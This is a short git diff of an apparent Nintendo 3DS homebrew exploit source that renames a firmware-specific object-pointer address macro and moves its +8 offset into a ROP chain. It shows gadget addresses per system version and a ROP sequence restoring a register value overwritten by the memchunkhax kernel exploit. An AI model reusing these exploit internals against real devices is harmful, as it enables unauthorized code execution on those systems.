@@ -224,11 +224,11 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #endif
 
 #if SYSVER==97
-	#define ORIGINALOBJPTR_LOADADR (0x0032d848+8)
+	#define ORIGINALOBJPTR_BASELOADADR 0x0032d848
 #endif
 
 #if SYSVER==96
-	#define ORIGINALOBJPTR_LOADADR (0x0032e848+8)
+	#define ORIGINALOBJPTR_BASELOADADR 0x0032e848
 #endif
 
 #if SYSVER>=93 && SYSVER<=95 //v9.3-v9.5
@@ -237,7 +237,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 	#define ROP_STR_R1TOR0 0x00103f58
 	#define ROP_LDR_R0FROMR0 0x0010f01c
 
-	#define ORIGINALOBJPTR_LOADADR (0x0031382c+8) //The ptr stored here is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
+	#define ORIGINALOBJPTR_BASELOADADR 0x0031382c //The ptr stored here+8 is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
 #endif
 
 #if SYSVER>=90 && SYSVER <= 92 //v9.0-v9.2
@@ -302,7 +302,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 	#define NSS_LaunchTitle 0x0020e6a8
 
-	#define ORIGINALOBJPTR_LOADADR (0x002f1820+8)
+	#define ORIGINALOBJPTR_BASELOADADR 0x002f1820
 
 	#define APT_SendParameter 0x00205c08
 
@@ -347,7 +347,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 	#define ROP_INITOBJARRAY 0x0020a3a5
 
-	#define ORIGINALOBJPTR_LOADADR (0x002f0820+8)
+	#define ORIGINALOBJPTR_BASELOADADR 0x002f0820
 #endif
 
 #define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12
@@ -480,7 +480,7 @@ ROP_SETLR ROP_POPPC
 .word TARGETOVERWRITE_STACKADR @ r0
 
 .word POP_R1PC
-.word ORIGINALOBJPTR_LOADADR @ r1
+.word (ORIGINALOBJPTR_BASELOADADR+8) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
 .endm
